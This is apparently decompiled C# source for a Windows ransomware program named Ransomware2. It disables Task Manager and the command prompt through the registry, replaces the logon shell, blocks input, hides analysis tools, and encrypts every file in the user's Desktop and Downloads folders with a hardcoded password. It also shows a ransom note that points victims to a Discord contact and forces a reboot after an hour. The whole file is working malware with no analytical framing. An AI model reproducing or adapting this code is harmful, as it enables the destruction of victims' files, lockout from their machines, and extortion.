using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Rasomware2._0;

public class Ransomware2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private object _Path_textBox;

	private IContainer components = null;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Label lbl1;

	private Label label1;

	private TextBox codebox;

	private Button button1;

	private Label label2;

	private Label label3;

	private Timer tmr_hide;

	private Timer tmr_show;

	private Timer tmr_if;

	private Timer tmr_encrypt;

	private Timer tmr_clock;

	private Label label4;

	private Label label5;

	private Label label6;

	private Label label7;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public Ransomware2()
	{
		InitializeComponent();
		((Control)label2).set_Text(TimeSpan.FromMinutes(200.0).ToString());
	}

	private void Ransomware2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Ransomware2_Load(object sender, EventArgs e)
	{
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		FreezeMouse();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		registryKey2.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey3.SetValue("Wallpaper", "", RegistryValueKind.String);
		RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey4.SetValue("Shell", "empty", RegistryValueKind.String);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label2).set_Text((TimeSpan.FromMinutes(4320.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_hide.Start();
		tmr_show.Start();
		tmr_if.Start();
		tmr_encrypt.Start();
		tmr_clock.Start();
	}

	private void tmr_hide_Tick(object sender, EventArgs e)
	{
		tmr_hide.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(701, 584));
		((Form)this).set_Location(new Point(500, 500));
		Thawouse();
	}

	private void tmr_show_Tick(object sender, EventArgs e)
	{
		tmr_show.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
	}

	public void enkrippolder(string lokasi, string pwd)
	{
		string[] source = new string[137]
		{
			".mid", ".wma", ".flv", ".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg",
			".wmv", ".fla", ".swf", ".wav", ".qcow2", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes",
			".ARC", ".PAQ", ".tar.bz2", ".tbk", ".bak", ".tar", ".tgz", ".rar", ".zip", ".djv",
			".djvu", ".svg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif",
			".tiff", ".NEF", ".psd", ".cmd", ".class", ".jar", ".java", ".asp", ".brd", ".sch",
			".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf", ".ibd",
			".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB", ".SQLITE3", ".asc",
			".lay6", ".lay", ".ms11 (Security copy)", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml",
			".sxm", ".otg", ".odg", ".uop", ".potx", ".potm", ".pptx", ".pptm", ".std", ".sxd",
			".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx",
			".xlsm", ".xlsb", ".slk", ".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc",
			".ots", ".ods", ".hwp", ".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml",
			".txt", ".CSV", ".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott",
			".odt", ".DOC", ".pem", ".csr", ".crt", ".key", " wallet.dat"
		};
		string[] files = Directory.GetFiles(lokasi);
		string[] directories = Directory.GetDirectories(lokasi);
		for (int i = 0; i < files.Length; i++)
		{
			string extension = Path.GetExtension(files[i]);
			if (source.Contains(extension))
			{
				EnkripPile(files[i], pwd);
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			enkrippolder(directories[j], pwd);
		}
	}

	private object EnkripPile(string v, string pwd)
	{
		throw new NotImplementedException();
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker2")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
		}
		tmr_if.Start();
	}

	private void tmr_encrypt_Tick(object sender, EventArgs e)
	{
		tmr_encrypt.Stop();
		Start_Encrypt();
	}

	private void tmr_clock_Tick(object sender, EventArgs e)
	{
		tmr_clock.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("Rasomware2.0");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start("shutdown", "/r /t 0");
			process.Kill();
		}
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)codebox).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)codebox).get_Text() == "123123")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
			registryKey3.SetValue("DisableCMD", 0, RegistryValueKind.String);
			OFF_Encrypt();
			Process[] array = null;
			array = Process.GetProcessesByName("Rasomware2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void codebox_TextChanged(object sender, EventArgs e)
	{
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "123";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "123";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
		}
	}

	private void pictureBox2_Click(object sender, EventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void label4_Click_1(object sender, EventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Expected O, but got Unknown
		//IL_01bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c9: Expected O, but got Unknown
		//IL_027b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0285: Expected O, but got Unknown
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_0352: Expected O, but got Unknown
		//IL_0415: Unknown result type (might be due to invalid IL or missing references)
		//IL_041f: Expected O, but got Unknown
		//IL_04d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04dd: Expected O, but got Unknown
		//IL_0668: Unknown result type (might be due to invalid IL or missing references)
		//IL_0672: Expected O, but got Unknown
		//IL_0709: Unknown result type (might be due to invalid IL or missing references)
		//IL_0713: Expected O, but got Unknown
		//IL_079a: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a4: Expected O, but got Unknown
		//IL_082d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0837: Expected O, but got Unknown
		//IL_08c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08cd: Expected O, but got Unknown
		//IL_0967: Unknown result type (might be due to invalid IL or missing references)
		//IL_0971: Expected O, but got Unknown
		//IL_0b0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b17: Expected O, but got Unknown
		//IL_0b58: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b62: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ransomware2));
		lbl1 = new Label();
		label1 = new Label();
		codebox = new TextBox();
		button1 = new Button();
		label2 = new Label();
		label3 = new Label();
		tmr_hide = new Timer(components);
		tmr_show = new Timer(components);
		tmr_if = new Timer(components);
		tmr_encrypt = new Timer(components);
		tmr_clock = new Timer(components);
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		label7 = new Label();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lbl1).set_AutoSize(true);
		((Control)lbl1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lbl1).set_ForeColor(Color.White);
		((Control)lbl1).set_Location(new Point(13, 13));
		((Control)lbl1).set_Name("lbl1");
		((Control)lbl1).set_Size(new Size(0, 25));
		((Control)lbl1).set_TabIndex(2);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Cursor(Cursors.get_Help());
		((Control)label1).set_Font(new Font("Trebuchet MS", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(86, 13));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(672, 54));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("Whoops... All your documents, videos, pictures, music and others \r\nhave been ENCRYPED!\r\n");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)codebox).set_BackColor(Color.Black);
		((Control)codebox).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)codebox).set_ForeColor(Color.White);
		((Control)codebox).set_Location(new Point(211, 364));
		((Control)codebox).set_Name("codebox");
		((Control)codebox).set_Size(new Size(398, 31));
		((Control)codebox).set_TabIndex(5);
		codebox.set_TextAlign((HorizontalAlignment)2);
		((Control)codebox).add_TextChanged((EventHandler)codebox_TextChanged);
		((Control)button1).set_BackColor(Color.Black);
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).set_FlatStyle((FlatStyle)1);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(183, 430));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(398, 53));
		((Control)button1).set_TabIndex(6);
		((Control)button1).set_Text("DECRYPT FILES");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Cursor(Cursors.get_No());
		((Control)label2).set_Font(new Font("Arial Black", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(449, 499));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(111, 30));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("00:00:00");
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Cursor(Cursors.get_No());
		((Control)label3).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(174, 499));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(260, 37));
		((Control)label3).set_TabIndex(8);
		((Control)label3).set_Text("REAMING TIME:");
		tmr_hide.set_Enabled(true);
		tmr_hide.set_Interval(10000);
		tmr_hide.add_Tick((EventHandler)tmr_hide_Tick);
		tmr_show.set_Enabled(true);
		tmr_show.set_Interval(1000);
		tmr_show.add_Tick((EventHandler)tmr_show_Tick);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(300);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		tmr_encrypt.set_Enabled(true);
		tmr_encrypt.set_Interval(1000);
		tmr_encrypt.add_Tick((EventHandler)tmr_encrypt_Tick);
		tmr_clock.set_Enabled(true);
		tmr_clock.set_Interval(3600000);
		tmr_clock.add_Tick((EventHandler)tmr_clock_Tick);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(24, 139));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(474, 16));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("Now you need to contact bl4ack#1337 on the discord asking for the decrypt key");
		label4.set_TextAlign((ContentAlignment)32);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(21, 84));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(142, 29));
		((Control)label5).set_TabIndex(10);
		((Control)label5).set_Text("- And now?");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.White);
		((Control)label6).set_Location(new Point(4, 178));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(577, 29));
		((Control)label6).set_TabIndex(11);
		((Control)label6).set_Text("- is there another way for me to recover my files?");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.White);
		((Control)label7).set_Location(new Point(24, 237));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(282, 16));
		((Control)label7).set_TabIndex(12);
		((Control)label7).set_Text("No. only with our key we can recover your files.");
		((Control)pictureBox2).set_Cursor(Cursors.get_No());
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(633, 378));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(125, 105));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox2).add_Click((EventHandler)pictureBox2_Click);
		((Control)pictureBox1).set_Cursor(Cursors.get_No());
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(38, 378));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(125, 105));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(96f, 96f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)2);
		((ScrollableControl)this).set_AutoScroll(true);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(804, 572));
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)codebox);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)lbl1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Ransomware2");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Decryptor");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Ransomware2_FormClosing));
		((Form)this).add_Load((EventHandler)Ransomware2_Load);
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
